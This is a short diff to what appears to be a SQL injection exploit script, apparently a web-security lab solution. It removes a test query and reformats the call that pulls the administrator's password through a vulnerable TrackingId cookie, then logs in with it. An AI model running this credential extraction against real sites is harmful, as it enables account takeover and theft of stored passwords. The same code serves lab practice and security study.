@@ -66,10 +66,11 @@ def main(args):
     session_token = resp.cookies["session"]
     log.info(f"TrackingId: {tracking_id}")
     sqli = MySQLi(tracking_id, session_token)
-    print(sqli.get_response_string("SELECT 'aaaa'", shop.base_url, shop.no_proxy, 1))
     password = sqli.get_response_string(
        "SELECT password from users where username = 'administrator'", 
-       shop.base_url,shop.no_proxy,1
+       shop.base_url,
+       shop.no_proxy,
+       1,
        )
     log.info(f"Received password: {password}")
     shop.login("administrator", password)
